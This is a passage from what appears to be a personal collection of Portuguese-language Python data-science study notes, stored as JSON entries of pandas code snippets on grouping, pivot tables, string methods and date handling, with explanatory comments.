how='left')\n#print(final)\n\n#7\ncolunas_nulas_final = final.isnull().any()\n\n#8\nareas_nulas = final['state'][final['area (sq. mi)'].isnull()].unique()\n\n#9\nfinal.dropna(inplace=True)\n\n#10\ndata2010 = final.query(\"year == 2010 & ages == 'total'\")\n\n#11\ndata2010.set_index('state', inplace=True)\n\n#12\ndensity = data2010['population'] / data2010['area (sq. mi)']\n\n#13\ndensity.sort_values(ascending=False, inplace=True)\n#ordenado = df.sort_values(by='coluna', inplace=True|False, ascending=Fasle|True) #ordenar um dataframe\nprint(density)\n\n#14\nprint(density.tail())\n\n\n\n"}, "Pandas - Aggregation and Grouping - sum(), mean(), median(), min(), max(), describe()": {"codigo": "import pandas as pd\nimport numpy as np\nimport seaborn as sns\n'''\n1# Uma array de 0 a 1 de 5 valores aleat\u00f3rios\n\n2# Soma | media de todas a coluna do Series\n\n3# DataFrame com coluna A e B e os dados s\u00e3o arrays de 0 a 1 de 5 valores \naleat\u00f3rios\n\n4# M\u00e9dia de cada colunas do dataframe\n\n5# Usando o axis=1 temos a m\u00e9dia horizontal, para cada linha passando pela colunas.\n'''\n\nrng = np.random.RandomState(42)\n\n#1\nser = pd.Series(rng.rand(5))\n\n#2\nsoma = ser.sum()\nmedia = ser.mean()\n\n#3\ndf = pd.DataFrame({'A': rng.rand(5),\n\t'B': rng.rand(5)})\n'''\n          A         B\n0  0.155995  0.020584\n1  0.058084  0.969910\n2  0.866176  0.832443\n3  0.601115  0.212339\n4  0.708073  0.181825\n'''\n #4\nmedia_df = df.mean()\nprint(media_df)\n\n#5\nmedia_df1 = df.mean(axis='columns')\nprint(media_df1)\n\nDESCRIBE#########################################################\n################################################################\n\n\nimport seaborn as sns\nimport pandas as pd\nimport numpy as np\n'''\nEstamos descrevendo o dataframe. Para isso devemos usar o dropna() para retirar\ntodas as linhas que tenham conte\u00fados nulos\n'''\nplanets = sns.load_dataset('planets')\nprint(planets.head())\n\ndescribe = planets.dropna().describe()\nprint(describe)\n\n\n\n\n\n\n\n###############################################################\n###############################################################\ncount() \t\tTotal number of items \nfirst(), last() \t\tFirst and last item \nmean(), median() \tMean and median \nmin(), max() \t\tMinimum and maximum \nstd(), var() \t\tStandard deviation and variance \nmad() \t\tMean absolute deviation \nprod() \t\tProduct of all items \nsum() \t\tSum of all items\n", "categoria": "python ciencia de dados handbook"}, "Pandas = Aggregation and Grouping - GroupBy: Split, Apply, Combine": {"categoria": "python ciencia de dados handbook", "codigo": "GROUPBY ############################################################\n####################################################################\n\nimport pandas as pd\nimport numpy as np\n\ndf = pd.DataFrame({'key':['A', 'B', 'C', 'A', 'B', 'C'],\n'data': range(6)}, columns=['key', 'data'])\n'''\n  key  data\n0   A     0\n1   B     1\n2   C     2\n3   A     3\n4   B     4\n5   C     5\n'''\n\n\ngroupby_sum = df.groupby('key').sum()\n'''\n     data\nkey\nA       3\nB       5\nC       7\n'''\n\n\n\n\n\n\nimport pandas as pd\nimport numpy as np\nimport seaborn as sns\n\n'''\nEscolhemos a coluna que vamos agrupa e qual coluna a opera\u00e7\u00e3o ser\u00e1 feita, \ndizemos tamb\u00e9m qual opera\u00e7\u00e3o queremos fazer\n'''\n\nplanets = sns.load_dataset('planets')\n'''\n            method  number  orbital_period   mass  distance  year\n0  Radial Velocity       1         269.300   7.10     77.40  2006\n1  Radial Velocity       1         874.774   2.21     56.95  2008\n2  Radial Velocity       1         763.000   2.60     19.84  2011\n3  Radial Velocity       1         326.030  19.40    110.62  2007\n4  Radial Velocity       1         516.220  10.50    119.47  2009\n'''\n\nmethod = planets.groupby('method')['orbital_period'].median()\n'''\nmethod\nAstrometry                         631.180000\nEclipse Timing Variations         4343.500000\nImaging                          27500.000000\nMicrolensing                      3300.000000\nOrbital Brightness Modulation        0.342887\nPulsar Timing                       66.541900\nPulsation Timing Variations       1170.000000\nRadial Velocity                    360.200000\nTransit                              5.714932\nTransit Timing Variations           57.011000\nName: orbital_period, dtype: float64\n'''\n\ndescribe = planets.groupby('method')['year'].describe()\nprint(describe)\n\n\n\n\nAGGREGATION ###########################################################\n######################################################################\nimport numpy as np\nimport pandas as pd\n\n'''\n\u00c9  a mesma coisa de usar o groupby sem o aggregation, a diferen\u00e7a \u00e9 que, na agrega\u00e7\u00e3o\nvoc\u00ea pode agregar em uma coluna por soma e em outra coluna por m\u00e9dia\n\n'''\n\n\nrng = np.random.RandomState(0)\ndf = pd.DataFrame({'key': ['A', 'B', 'C', 'A', 'B', 'C'],\n\t'data1': range(6),\n\t'data2': rng.randint(0, 10, 6)},\n\tcolumns=['key', 'data1', 'data2'])\n\t\n'''\n  key  data1  data2\n0   A      0      5\n1   B      1      0\n2   C      2      3\n3   A      3      3\n4   B      4      7\n5   C      5      9\n'''\n\t\naggregate = df.groupby('key').aggregate({'data1': 'min',\n\t'data2': 'max'})\n'''\n     data1  data2\nkey\nA        0      5\nB        1      7\nC        2      9\n'''\n\n\nFILTER ##############################################################\n###################################################################\nimport numpy as np\nimport pandas as pd\n\n'''\nNo caso de um groupby, os grupos s\u00e3o formados de acordo com a agrega\u00e7\u00e3o,\nsendo assim o filter ou espera uma fun\u00e7\u00e3o, ou uma lambida, pois a conta \u00e9 \nfeito para todos os grupos gerados pelo groupby e a fun\u00e7\u00e3o vem verificando\ngrupo a grupo qual ser\u00e1 mantido ou n\u00e3o pela condi\u00e7\u00e3o booleana imposta.\nO 'x' significa cada grupo.\n\nA fun\u00e7\u00e3o est\u00e1 filtrando groupbys que tiveram desvio padr\u00e3o menor do que 4\n'''\n\nrng = np.random.RandomState(0)\ndf = pd.DataFrame({'key': ['A', 'B', 'C', 'A', 'B', 'C'],\n\t'data1': range(6),\n\t'data2': rng.randint(0, 10, 6)},\n\tcolumns=['key', 'data1', 'data2'])\n\t\n'''\n  key  data1  data2\n0   A      0      5\n1   B      1      0\n2   C      2      3\n3   A      3      3\n4   B      4      7\n5   C      5      9\n'''\n\t\ndef filter_func(x):\n\treturn x['data2'].std() > 4\n\nfilter_lambida = df.groupby('key').filter(lambda x: x['data2'].std() > 4)\nfilter_func = df.groupby('key').filter(filter_func)\n\n\nprint(filter_lambida)\nprint(filter_func)\n\n\n\nTRANSFORM ############################################################\n######################################################################\n\nimport numpy as np\nimport pandas as pd\n\n'''\nO transform() transforma o dataframe, nesse caso est\u00e1 subtraindo \na m\u00e9dia do grupo pelo valor individual.\n'''\n\nrng = np.random.RandomState(0)\ndf = pd.DataFrame({'key': ['A', 'B', 'C', 'A', 'B', 'C'],\n\t'data1': range(6),\n\t'data2': rng.randint(0, 10, 6)},\n\tcolumns=['key', 'data1', 'data2'])\n\t\n'''\n  key  data1  data2\n0   A      0      5\n1   B      1      0\n2   C      2      3\n3   A      3      3\n4   B      4      7\n5   C      5      9\n'''\n\t\ntransform = df.groupby('key').transform(lambda x: x - x.mean())\nprint(transform)\n\nAPPLY ################################################################\n#####################################################################\n\nimport numpy as np\nimport pandas as pd\n\n'''\nApply aplica, nesse caso o data1 ser\u00e1 igual a divis\u00e3o do data1 pela \nsoma total do data2\n'''\n\nrng = np.random.RandomState(0)\ndf = pd.DataFrame({'key': ['A', 'B', 'C', 'A', 'B', 'C'],\n\t'data1': range(6),\n\t'data2': rng.randint(0, 10, 6)},\n\tcolumns=['key', 'data1', 'data2'])\n\t\n'''\n  key  data1  data2\n0   A      0      5\n1   B      1      0\n2   C      2      3\n3   A      3      3\n4   B      4      7\n5   C      5      9\n'''\n\t\ndef norm_by_data2(x):\n\tx['data1'] /= x['data2'].sum()\n\treturn x\n\t\napply = df.groupby('key').apply(norm_by_data2)\nprint(apply)\n"}, "Pandas - PivotTables - groupby e agrega\u00e7\u00f5es": {"codigo": "PIVOT TABLES ###########################################################\n######################################################################\n\nimport pandas as pd\nimport numpy as np\nimport seaborn as sns\n'''\n1# Agrupando pela coluna 'sex' e fazendo as contas pela coluna 'survived'.\n\n2# Agrupando pela colunas 'sex' & 'class', fazendo as contas pela coluna\n'survived'\n\n3# Usando o Pivot:\npivot_table('coluna pra contas', \nindex='virar linha', \ncolumns='virar coluna', \naggfunc='qual c\u00e1lculo fazer no agrupo') \n'''\n\ntitanic = sns.load_dataset('titanic')\n'''\n['survived', 'pclass', 'sex', 'age', 'sibsp', 'parch', 'fare',\n       'embarked', 'class', 'who', 'adult_male', 'deck', 'embark_town',\n       'alive', 'alone']\n'''\n\n#1\nsex_sobre = titanic.groupby('sex')['survived'].mean()\n'''\nsex\nfemale    0.742038\nmale      0.188908\n'''\n\n#2\nsex_sobre_class = titanic.groupby(['sex', 'class'])['survived'].mean().unstack()\n'''\nclass      First    Second     Third\nsex\nfemale  0.968085  0.921053  0.500000\nmale    0.368852  0.157407  0.135447\n'''\n\n#3\npivot = titanic.pivot_table('survived', index='sex', columns='class', aggfunc='mean')\n'''\nclass      First    Second     Third\nsex\nfemale  0.968085  0.921053  0.500000\nmale    0.368852  0.157407  0.135447\n'''\n\nMULTILEVEL TABLES, groupby de duas colunas ou classifica\u00e7\u00f5es #####################\n#####################################################################\nimport pandas as pd\nimport numpy as np\nimport seaborn as sns\n'''\n1# Classificando um Series onde o resultado ser\u00e1 a classifica\u00e7\u00e3o para cada \nidade da linha, ou seja, 0 a 18, 18 a 80, em qual intervalo a idade est\u00e1.\n\n2# Usando passamos a coluna o age e o 'sex', fezendo um multiindex e agrupando\npele sexo e pela classifica\u00e7\u00e3o da idade.\n'''\n\ntitanic = sns.load_dataset('titanic')\n'''\n['survived', 'pclass', 'sex', 'age', 'sibsp', 'parch', 'fare',\n       'embarked', 'class', 'who', 'adult_male', 'deck', 'embark_town',\n       'alive', 'alone']\n'''\n\n#1\nage = pd.cut(titanic['age'], [0, 18, 80])\n\n#2\npivot=titanic.pivot_table('survived', index=['sex', age], columns='class', aggfunc='mean') \n'''\nclass               First    Second     Third\nsex    age\nfemale (0, 18]   0.909091  1.000000  0.511628\n       (18, 80]  0.972973  0.900000  0.423729\nmale   (0, 18]   0.800000  0.600000  0.215686\n       (18, 80]  0.375000  0.071429  0.133663\n'''\n \n\nDUAS AN\u00c1ILISES POR TABELA | TOTAL HORIZONTAL E VERTICAL ####################\n####################################################################\nimport pandas as pd\nimport numpy as np\nimport seaborn as sns\n'''\n1# Fazendo duas tableas ao mesmo tempo\n\n2# Adicionando totais, horizontalmente e verticalmente\n\n'''\ntitanic = sns.load_dataset('titanic')\n'''\n['survived', 'pclass', 'sex', 'age', 'sibsp', 'parch', 'fare',\n       'embarked', 'class', 'who', 'adult_male', 'deck', 'embark_town',\n       'alive', 'alone']\n'''\n\n#1\npivot = titanic.pivot_table(index='sex', columns='class', aggfunc={'survived':sum, 'fare':'mean'})\n'''\n              fare                       survived\nclass        First     Second      Third    First Second Third\nsex\nfemale  106.125798  21.970121  16.118810       91     70    72\nmale     67.226127  19.741782  12.661633       45     17    47\n'''\nprint(pivot)\n#2\npivot0 = titanic.pivot_table('survived', index='sex', columns='class', margins=True)\n'''\nclass      First    Second     Third       All\nsex\nfemale  0.968085  0.921053  0.500000  0.742038\nmale    0.368852  0.157407  0.135447  0.188908\nAll     0.629630  0.472826  0.242363  0.383838\n'''\n", "categoria": "python ciencia de dados handbook"}, "Pandas - PivotTables + matplotlib gr\u00e1ficos em linha": {"categoria": "python ciencia de dados handbook", "codigo": "import pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport locale\n'''\n#1 separando os quartis, identificando a mediana e fazendo o sigma, \ncalculamos o topo e a base, e fazemos o filtro, apenas dados que est\u00e3o\nentre o topo e a base, serve para n\u00e3o dar uma discrep\u00e2ncia muito grande \nna an\u00e1slia de dados.\n\n#2 Fazendo filtro, o @ serve para identificar que a vari\u00e1vel est\u00e1 do \nlado de fora da query.\n\n#3 Transformando os dados das colunas para o tipo 'int'\n\n#4 Juntando a coluna 'year', 'month', 'day' com uma multiplica\u00e7\u00e3o e soma, \natrav\u00e9s dessa t\u00e9cnica 19600000 + 100 + 1 = 19601201, 1960|12|01.\nespecificamos o formato no final. Colocamos o resultado em uma nova coluna\nchamada index\n\n#5 Criamos uma coluna que extrair\u00e1 o dia da semana da data.\n\n#6 Divide 1967 por 10 = 196.7 e joga fora a parte decimal, quando multiplica\npor 10, categoriza por d\u00e9cada 1960\n\n#7 births['dayofweek'] = births['dayofweek'].map(lambda x: dias[x]), \nseleciona a coluna 'dayofweek' usa a fun\u00e7ao 'map', \ntesta cada valor por linha, o valor da linha vai ser o x, \nse o valor por '0' o resultado vai se 'dom' na lista, pois domingo\nest\u00e1 na posi\u00e7\u00e3o '0'\n\n\n#8 Coluna de calculo, agrupar por, virar coluna, tipo de conta\n\n#9 'fig' \u00e9 o template, pense como uma p\u00e1gina em branco, 'axs' s\u00e3o os gr\u00e1ficos\nconhecidos como eixos, primeiro 2, 2, duas linhas e duas colunas,\nplt.tight_layout() serve para os gr\u00e1ficos e suas informa\u00e7\u00f5es n\u00e3o se sobreporem.\n'''\n\nbirths = pd.read_csv('births.csv')\nlocale.setlocale(locale.LC_TIME, 'pt_BR.UTF-8')\n\n#1\nquartiles = np.percentile(births['births'], [25, 50, 75])\nmediana = quartiles[1]\nsig = 0.74 * (quartiles[2] - quartiles[0])\ntopo=mediana + (5*sig)\nbase=mediana - (5*sig)\n\n#2\nbirths = births.query('(births > @base) & (births < @topo)')\n\n\n#3\nbirths['day'] = births['day'].astype(int)\n#4\nbirths.index = pd.to_datetime(10000 * births.year +\n\t100 * births.month + \n\tbirths.day, format='%Y%m%d')\n#5\nbirths['dayofweek'] = births.index.dayofweek #0, 1, 2, 3 para ordenar\n#births['dayofweek'] = births.index.day_name() #Am\u00e9rica\n#births['dayofweek']= births.index.strftime('%A') #Brasil\n#6\nbirths['decade'] = 10 * (births['year']//10)\n\ndias = ['Dom', 'Seg', 'Ter', 'Quar', 'Qui', 'Sex', 'Sab']\n\n#7\n#births['dayofweek'] = births['dayofweek'].map(lambda x: dias[x])\n'''\nCuidado aqui, os dias ser\u00e3o ordenados em ordem alfab\u00e9tica, n\u00e3o ficaram\nordenados de acordo com o dia correto\n'''\n\n\n\n#8\ndecade_pivot = births.pivot_table('births', index='decade', columns='gender', aggfunc='sum')\nyear_pivot = births.pivot_table('births', index=['year'], columns='gender', aggfunc='sum')\n\n\n#9\nfig, axs = plt.subplots(2, 2, figsize=(12, 8))\n\ndecade_pivot.plot(ax=axs[0, 0])\naxs[0, 0].set_ylabel('Quantidade de nascimentos')\naxs[0, 0].set_xlabel('D\u00e9cadas')\naxs[0, 0].set_title('Quantidade total de nascimento por d\u00e9cada')\n\nyear_pivot.plot(ax=axs[0, 1])\naxs[0, 1].set_ylabel('Quantidade de nascimentos')\naxs[0, 1].set_xlabel('Anos')\naxs[0, 1].set_title('Quantidade todal de nascimentos por ano')\n\nbirths_pivot = births.pivot_table('births', index='dayofweek', columns='decade',\naggfunc='mean').plot()\nplt.gca().set_xticks(range(7))\nplt.gca().set_xticklabels(['Dom', 'Seg', 'Ter', 'Quar', 'Qui', 'Sex', 'Sab'])\nplt.ylabel('M\u00e9dia de nascimentos por dia')\n\n\n\nplt.tight_layout()\nplt.show()\n\n\n\n\nVERS\u00c3O 2 ############################################################\n#####################################################################\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nbirths = pd.read_csv('births.csv')\n\n\nquartiles = np.percentile(births['births'], [25, 50, 75])\nmediana = quartiles[1]\nsig = 0.74 * (quartiles[2] - quartiles[0])\ntopo = mediana + (5*sig)\nbase = mediana - (5*sig)\n\nbirths = births.query('(births > @base) & (births < @topo)')\n\n\nbirths.index = pd.to_datetime(10000 * births.year +\n\t100 * births.month +\n\tbirths.day, format='%Y%m%d')\n\t\nbirths['dayofweek'] = births.index.dayofweek\nbirths['decade'] = 10 * (births['year']//10)\ndias = ['Dom', 'Seg', 'Ter', 'Qua', 'Qui', 'Sex', 'Sab']\n#births['dayofweek'] = births['dayofweek'].map(lambda x: dias[x])\n\ndecade_pivot = births.pivot_table('births', index='decade', columns='gender', aggfunc='sum')\nyear_pivot = births.pivot_table('births', index='year', columns='gender', aggfunc='sum')\nbirths_pivot = births.pivot_table('births', index='dayofweek', columns='decade', aggfunc='mean')\n\nfig, axs = plt.subplots(2, 2, figsize=(12, 8))\ndecade_pivot.plot(ax=axs[0, 0])\naxs[0, 0].set_ylabel('Quantidade de nascimentos')\naxs[0, 0].set_xlabel('D\u00e9cadas')\naxs[0, 0].set_title('Quantidade total de nascimento por d\u00e9cada')\n\nyear_pivot.plot(ax=axs[0, 1])\naxs[0, 1].set_ylabel('Quantidade de nascimentos')\naxs[0, 1].set_xlabel('Anos')\naxs[0, 1].set_title('Quantidade total de nascimentos por ano')\n\nbirths_pivot.plot(ax=axs[1, 0])\naxs[1, 0].set_ylabel('M\u00e9dia de nascimentos por dia')\naxs[1, 0].set_xticks(range(7))\naxs[1, 0].set_xticklabels(['Dom', 'Seg', 'Ter', 'Qua', 'Qui', 'Sex', 'Sab'])\n\n\n\nplt.tight_layout()\nplt.show()\n\n"}, "Pandas - Vectorized String Operations - Tabela de m\u00e9todos para strings": {"categoria": "python ciencia de dados handbook", "codigo": "TRABALHANDO COM STRINGS ############################################\n####################################################################\n\nimport pandas as pd\n\nmonte = pd.Series(['Graham Chapman', 'John Cleese', 'Terry Gilliam',\n 'Eric Idle', 'Terry Jones', 'Michael Palin'])\n \na1 = monte.str.lower()\na2 = monte.str.len()\na3 = monte.str.startwith('T')\na4 = monte.str.split()\na5 = monte.str.contains('ham', case=False) \ncase serve para verificar se \u00e9 sensivel a letra maiucula o minuscula\n\n'''\nlen() lower() translate() islower()\nljust() upper() startswith() isupper()\nrjust() find() endswith() isnumeric()\ncenter() rfind() isalnum() isdecimal()\nzfill() index() isalpha() split()\nstrip() rindex() isdigit() rsplit()\nrstrip() capitalize() isspace() partition()\nlstrip() swapcase() istitle() rpartition()\n'''\n\nREGULAR EXPRESSION ######################################################\n########################################################################\nimport pandas as pd\n\nmonte = pd.Series(['Graham Chapman', 'John Cleese', 'Terry Gilliam',\n 'Eric Idle', 'Terry Jones', 'Michael Palin'])\n \na1 = monte.str.extract('([A-Za-z]+)')\n\n# Pandas String Methods with Regular Expressions\n\n# 1. match()\n# Description: Calls `re.match()` on each element, returning a Boolean.\n# Tradu\u00e7\u00e3o: Chama `re.match()` em cada elemento, retornando um valor booleano (True ou False).\n\n# Example:\n# df['column'].str.match(pattern)\n\n# 2. extract()\n# Description: Calls `re.match()` on each element, returning matched groups as strings.\n# Tradu\u00e7\u00e3o: Chama `re.match()` em cada elemento, retornando os grupos capturados como strings.\n\n# Example:\n# df['column'].str.extract(pattern)\n\n# 3. findall()\n# Description: Calls `re.findall()` on each element.\n# Tradu\u00e7\u00e3o: Chama `re.findall()` em cada elemento, retornando todas as correspond\u00eancias encontradas como uma lista de strings.\n\n# Example:\n# df['column'].str.findall(pattern)\n\n# 4. replace()\n# Description: Replace occurrences of pattern with some other string.\n# Tradu\u00e7\u00e3o: Substitui ocorr\u00eancias de um padr\u00e3o (regex) por outra string.\n\n# Example:\n# df['column'].str.replace(pattern, replacement)\n\n# 5. contains()\n# Description: Calls `re.search()` on each element, returning a Boolean.\n# Tradu\u00e7\u00e3o: Chama `re.search()` em cada elemento, retornando um valor booleano (True ou False) se o padr\u00e3o for encontrado.\n\n# Example:\n# df['column'].str.contains(pattern)\n\n# 6. count()\n# Description: Count occurrences of pattern.\n# Tradu\u00e7\u00e3o: Conta o n\u00famero de ocorr\u00eancias de um padr\u00e3o (regex) em cada elemento.\n\n# Example:\n# df['column'].str.count(pattern)\n\n# 7. split()\n# Description: Equivalent to `str.split()`, but accepts regular expressions.\n# Tradu\u00e7\u00e3o: Funciona como `str.split()`, mas permite usar express\u00f5es regulares para dividir as strings.\n\n# Example:\n# df['column'].str.split(pattern)\n\n# 8. rsplit()\n# Description: Equivalent to `str.rsplit()`, but accepts regular expressions.\n# Tradu\u00e7\u00e3o: Funciona como `str.rsplit()`, mas permite usar express\u00f5es regulares para dividir as strings a partir do final.\n\n# Example:\n# df['column'].str.rsplit(pattern)\n\n\n\n##################################################################\n##################################################################\n\n\n\n# M\u00e9todos de String do Pandas\n\n# 1. get()\n# Descri\u00e7\u00e3o: Indexa cada elemento da string.\n# Exemplo:\n# df['coluna'].str.get(indice)\n\n# 2. slice()\n# Descri\u00e7\u00e3o: Fatiar cada elemento da string.\n# Exemplo:\n# df['coluna'].str.slice(inicio, fim, passo)\n\n# 3. slice_replace()\n# Descri\u00e7\u00e3o: Substitui uma fatia de cada elemento com o valor passado.\n# Exemplo:\n# df['coluna'].str.slice_replace(inicio, fim, substituto)\n\n# 4. cat()\n# Descri\u00e7\u00e3o: Concatena strings.\n# Exemplo:\n# df['coluna'].str.cat(outros, sep='')\n\n# 5. repeat()\n# Descri\u00e7\u00e3o: Repete os valores da string.\n# Exemplo:\n# df['coluna'].str.repeat(vezes)\n\n# 6. normalize()\n# Descri\u00e7\u00e3o: Retorna a forma Unicode da string.\n# Exemplo:\n# df['coluna'].str.normalize(forma)\n\n# 7. pad()\n# Descri\u00e7\u00e3o: Adiciona espa\u00e7os em branco \u00e0 esquerda, \u00e0 direita ou em ambos os lados das strings.\n# Exemplo:\n# df['coluna'].str.pad(largura, lado='both', caractere=' ')\n\n# 8. wrap()\n# Descri\u00e7\u00e3o: Divide strings longas em linhas com comprimento menor que a largura especificada.\n# Exemplo:\n# df['coluna'].str.wrap(largura)\n\n# 9. join()\n# Descri\u00e7\u00e3o: Junta strings em cada elemento da S\u00e9rie usando o separador especificado.\n# Exemplo:\n# df['coluna'].str.join(separador)\n\n# 10. get_dummies()\n# Descri\u00e7\u00e3o: Extrai vari\u00e1veis fict\u00edcias (dummies) como um DataFrame.\n# Exemplo:\n# df['coluna'].str.get_dummies(sep)\n\n\nEXEMPLOS #############################################################\n######################################################################\nimport pandas as pd\n\nmonte = pd.Series(['Graham Chapman', 'John Cleese', 'Terry Gilliam',\n 'Eric Idle', 'Terry Jones', 'Michael Palin'])\n \ncorte = monte.str[0:5]\nsplit = monte.str.split().str.get(-1)\n\nfull_monte = pd.DataFrame({'name': monte,\n\t'info': ['B|C|D', 'B|D', 'A|C', 'B|D', 'B|C',\n\t'B|C|D']})\n\nprint(full_monte['info'].str.get_dummies('|'))\n\n\n\n"}, "Pandas - Verctorized String Operations - Analisando string atividade": {"codigo": "import pandas as pd\nimport numpy as np\nimport re\n'''\n1# Importamos o arquivo json, usamos o 'lines' porque cada linha \u00e9 um\ndicion\u00e1rio de mesma estrutura.\n\n2# Seleciona a coluna 'ingredients' usa o 'str' para informar que estmaos\ntrabalhando com string, usamos o 'len' para saber quantas letras e epa\u00e7os tem,\nusamos o 'describe' para fazer uma an\u00e1lise desse coluna.\n\n3# \n3.1 - 'receitas['name'][0]' o segundo '[]' \u00e9 o \u00edndice posicional da coluna 'name'\n'np.argmax(coluna.str.len())' captura o \u00edndice posicional do maior valor de\nstring que tem.\n\n3.2 - Seleciona a coluna, informa o 'str' e usa 'contains' para identificar se\no que passamos como argumento est\u00e1 presente no conte\u00fado de cada linha, \ncada linha fica como 'True' ou 'False', quando usamos um 'sum()', estamos \nsomando apenas os valores que s\u00e3o verdadeiros.\n\n4# dict((x,a)) = chave 'x'|valor 'a', estamos fazendo um dicion\u00e1rio que \ncada chave vai ser um valor da lista, para cada valor da chave, vai ter um valor\nde um dicion\u00e1rio {} com todos os True | False:\n{'salt': {0: True, 1:False, 2:True}, 'pepper': {0: False, 1: True, 2: False}...}\n\no 'salt' | 'pepper' v\u00e3o virar as colunas, os Series do DataFrame e como as chave do \nsubdicion\u00e1rio '0, 1, 3' s\u00e3o iguais, ela s\u00e3o as linhas, ent\u00e3o ficar\u00e1 assim:\n\n\tsalt \tpepper\n0\tTrue\tFalse\n1\tFalse\tTrue\n2\tTrue\tFalse\n\n5# Fazendo uma query no spice_df, ('parsley & paprika & tarragon'), isso significa que\nestamos escolhendo as linhas que tenham as colunas descritas todas como 'True', \nUsamos os \u00edndices posicionais para acessar os \u00edndices posicionais da tabela \nreceitas['name']\n'''\n\n#1\nreceitas = pd.read_json('receitas.json', lines=True)\n'''\n['_id', 'name', 'ingredients', 'url', 'image', 'ts', 'cookTime',\n       'source', 'recipeYield', 'datePublished', 'prepTime', 'description',\n       'totalTime', 'creator', 'recipeCategory', 'dateModified',\n       'recipeInstructions']\n'''\n'''\nwith open('receitas.json', 'r', encoding='utf-8') as f:\n\tdata = (line.strip() for line in f)\n\tdata_json = \"[{0}]\".format(','.join(data))\n\nreceitas = pd.read_json(data_json)\n'''\n\n\n#2\ningrediente_describ = receitas['ingredients'].str.len().describe()\nprint(ingrediente_describ)\n\n#3\nprint(receitas['name'][np.argmax(receitas['ingredients'].str.len())])\nprint(receitas['description'].str.contains('[Bb]reakfast').sum())\nprint(receitas['ingredients'].str.contains('[Cc]innamon').sum())\nprint(receitas['ingredients'].str.contains('[Cc]inamon').sum())\n\nspice_list = ['salt', 'pepper', 'oregano', 'sage', 'parsley',\n 'rosemary', 'tarragon', 'thyme', 'paprika', 'cumin']\n#4\nspice_df = pd.DataFrame(\ndict((spice, receitas.ingredients.str.contains(spice, re.IGNORECASE)) for spice in spice_list))\nprint(spice_df.head())\n\n#5\nselection = spice_df.query('parsley & paprika & tarragon')\nprint(receitas['name'][selection.index])\n", "categoria": "python ciencia de dados handbook"}, "Pandas - Datas e horas - extra\u00e7\u00e3o e manipula\u00e7\u00e3o ": {"categoria": "python ciencia de dados handbook", "codigo": "######################################################################\n######################################################################\n\nimport numpy as np\nfrom datetime import datetime\nimport locale\n\nlocale.setlocale(locale.LC_TIME, 'pt_BR.UTF-8')\n\ndate = np.array('2015-07-04', dtype=np.datetime64)\ndate0= np.datetime64('2015-07-04')\ndate1= np.datetime64('2015-07-04 12:00')\ndate2= np.datetime64('2015-07-04 12:59:59.50', 'ns')\ndate3= datetime.now()\n\nprint(date)\nprint(date + np.arange(12))\nprint(date0)\nprint(date1)\nprint(date2)\nprint(date3)\nprint(date3.year)\nprint(date3.month)\nprint(date3.day)\nprint(date3.hour)\nprint(date3.second)\nprint(date3.microsecond)\nprint(date3.weekday())\nprint(date3.strftime('%A')) #Nome do dia da semana\nprint(date3.strftime('%B')) #Nome do m\u00eas\n\n'''\nY Year \t\t\t\u00b1 9.2e18 years \t[9.2e18 BC, 9.2e18 AD]\nM Month \t\t\u00b1 7.6e17 years \t[7.6e17 BC, 7.6e17 AD]\nW Week \t\t\t\u00b1 1.7e17 years \t[1.7e17 BC, 1.7e17 AD]\nD Day \t\t\t\u00b1 2.5e16 years \t[2.5e16 BC, 2.5e16 AD]\nh Hour \t\t\t\u00b1 1.0e15 years \t[1.0e15 BC, 1.0e15 AD]\nm Minute \t\t\u00b1 1.7e13 years \t[1.7e13 BC, 1.7e13 AD]\ns Second \t\t\u00b1 2.9e12 years \t[ 2.9e9 BC, 2.9e9 AD]\nms Millisecond \t\u00b1 2.9e9 years \t[ 2.9e6 BC, 2.9e6 AD]\nus Microsecond \t\u00b1 2.9e6 years \t[290301 BC, 294241 AD]\nns Nanosecond \t\u00b1 292 years \t[ 1678 AD, 2262 AD]\nps Picosecond \t\u00b1 106 days \t\t[ 1969 AD, 1970 AD]\nfs Femtosecond \t\u00b1 2.6 hours \t[ 1969 AD, 1970 AD]\nas Attosecond \t\u00b1 9.2 seconds \t[ 1969 AD, 1970 AD]\n'''\n\n\n#############################################################\n############################################################\n\nimport pandas as pd\nimport numpy as np\n\ndate = pd.to_datetime('4th of July, 2015')\nprint(date)\nprint(date.strftime('%A'))\nprint(date + pd.to_timedelta(np.arange(12), 'D'))\n"}, "Pandas - Datas e horas - indexando pelo tempo": {"codigo": "import pandas as pd\nimport numpy as np\n\nindex = pd.DatetimeIndex(['2014-07-04', '2014-08-04',\n '2015-07-04', '2015-08-04'])\n \ndata = pd.Series([0, 1, 2, 3], index=index)\nprint(data)\nprint(data['2014-07-04':'2015-07-04'])#selecionad o indice 'a' ao 'b'\nprint(data['2015'])#seleciona apenas os idices 2015\n", "categoria": "python ciencia de dados handbook"}, "Pandas - Datas e horas - Data Structures": {"codigo": "###################################################################\n###################################################################\nimport pandas as pd\nimport numpy as np\nfrom datetime import datetime\n\ndates = pd.to_datetime([datetime(2015, 7, 3), '4th of July, 2015',\n'2015-jul-6', '07-07-2015', '20150708'])\nprint(dates)\t\nprint(dates.to_period('D'))\n\nprint(dates - dates[0])\n\n\n", "categoria": "python ciencia de dados handbook"}, "Pandas - Datas e horas - per\u00edodos": {"categoria": "python ciencia de dados handbook", "codigo": "import pandas as pd\nimport numpy as np\nfrom datetime import datetime\n'''\ndata0 - seleciona e faz um series com as datas iniciais, mais as datas\nat\u00e9 chegar na data m\u00e1xima.\n\ndata1 - seleciona a data inicial e adciona mais datas, o 'periods' \u00e9 \nigual a 8, m\u00e3o s\u00e3o adicionadas 7 datas, data inicial mais 7 datas.\n\ndata2 - ao inv\u00e9s de aumentar os dias, aumenta as horas\n\ndata3 - ao inv\u00e9s de aumentar os dias, aumentas os meses\n\ndata4 - ponto de partida \u00e9 '0', acrescenta 10 partes de tempo, \nno caso e horas\n'''\n\ndata0 = pd.date_range('2015-07-03', '2015-07-10')\ndata1 = pd.date_range('2015-07-03', periods=8)\ndata2 = pd.date_range('2015-07-03', periods=8, freq='H')\ndata3 = pd.date_range('2015-07-03', periods=8, freq='M')\ndata4 = pd.timedelta_range(0, periods=10, freq='H')\n\n\nprint(data0)\nprint(data1)\nprint(data2)\nprint(data3)\nprint(data4)\n\n\n'''\n\nD Calendar day \tB Business day\nW Weekly\nM Month end \tBM Business month end\nQ Quarter end \tBQ Business quarter end\nA Year end \t\tBA Business year end\nH Hours \t\tBH Business hours\nT Minutes\nS Seconds\nL Milliseonds\nU 